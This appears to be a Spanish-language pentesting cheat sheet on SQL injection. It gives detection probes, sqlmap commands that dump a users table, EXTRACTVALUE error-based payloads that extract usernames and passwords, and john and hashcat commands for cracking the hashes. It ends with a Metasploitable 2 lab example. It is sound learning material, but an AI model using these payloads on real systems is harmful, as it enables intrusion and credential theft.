# SQL Injection (SQLi)

## Descripción

La inyección SQL es una vulnerabilidad que ocurre cuando una aplicación **inserta datos del usuario directamente en una consulta SQL sin sanitizarlos**. El atacante puede manipular la consulta para extraer datos, modificar la base de datos o incluso ejecutar comandos en el sistema operativo.

---

## Tipos de SQLi

| Tipo | Descripción | Cuándo usarlo |
|------|-------------|---------------|
| **Error-based** | El error de MySQL devuelve datos directamente en la respuesta | Cuando la app muestra errores de BD |
| **Union-based** | Se añade un SELECT adicional para extraer datos | Cuando la respuesta muestra datos de la consulta |
| **Boolean-based blind** | Se hacen preguntas true/false y se analiza la respuesta | Cuando no hay errores visibles |
| **Time-based blind** | Se usa SLEEP() para inferir datos por el tiempo de respuesta | Cuando no hay ninguna respuesta visible |
| **ORDER BY injection** | El parámetro se inserta en la cláusula ORDER BY | Cuando el parámetro controla el orden de resultados |

---

## Detección manual

### En parámetros GET/POST normales

Añade una comilla simple al valor del parámetro:

```
http://TARGET/page.php?id=1'
```

Si devuelve un error SQL, el parámetro es inyectable.

### En cláusulas ORDER BY

La cláusula ORDER BY no acepta comillas de la misma forma. Prueba con un valor inválido:

```
http://TARGET/page.php?sort=AAAA
```

Si devuelve un error como `Unknown column 'AAAA' in 'order clause'`, hay inyección en ORDER BY.

Para confirmar, prueba con un valor válido:

```
http://TARGET/page.php?sort=nombre_asc
```

Si la página carga correctamente, el formato esperado es `columna_dirección`.

---

## Explotación con SQLMap

### Detección básica

```shell
sqlmap -u "http://TARGET/page.php?id=1" --batch
```

### Extraer bases de datos

```shell
sqlmap -u "http://TARGET/page.php?id=1" --dbs --batch
```

### Extraer tablas

```shell
sqlmap -u "http://TARGET/page.php?id=1" -D nombre_db --tables --batch
```

### Volcar tabla de usuarios

```shell
sqlmap -u "http://TARGET/page.php?id=1" -D nombre_db -T users --dump --batch
```

### Para inyecciones en ORDER BY

```shell
sqlmap -u "http://TARGET/page.php?sort=nombre_asc" \
  --dbms=mysql \
  --technique=E \
  --suffix="_asc" \
  --level=3 --risk=2 \
  --batch
```

---

## Explotación manual — Error-based

Si MySQL muestra errores, puedes extraer datos directamente con `EXTRACTVALUE`:

```
http://TARGET/page.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))
```

Resultado esperado en el error:
```
XPATH syntax error: '~root@localhost~'
```

Para extraer usuarios de una tabla:
```
http://TARGET/page.php?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(user,0x3a,password) FROM users LIMIT 1),0x7e))
```

---

## Crackear hashes obtenidos

Los hashes de contraseñas extraídos suelen ser MD5 en aplicaciones antiguas:

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# o
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Notas importantes

- Si el parámetro está **vacío** en la URL, SQLMap no puede comparar respuestas. Siempre proporciona un valor base válido.
- Las inyecciones en **ORDER BY** son más difíciles de explotar que las de WHERE porque no aceptan los mismos payloads.
- Algunos frameworks validan el valor del parámetro contra una **whitelist de columnas**, bloqueando payloads directos aunque la inyección exista.

---

## Ejemplo real — Máquina Metasploitable 2

TikiWiki 1.9.5 tenía una inyección SQL en el parámetro `sort_mode` de `tiki-listpages.php`. El error confirmaba que el valor se insertaba directamente en `ORDER BY`:

```
Unknown column '' in 'order clause'
```

La aplicación validaba el formato `columna_asc/desc` pero bloqueaba payloads de `EXTRACTVALUE`, por lo que la inyección no fue explotable en este caso.
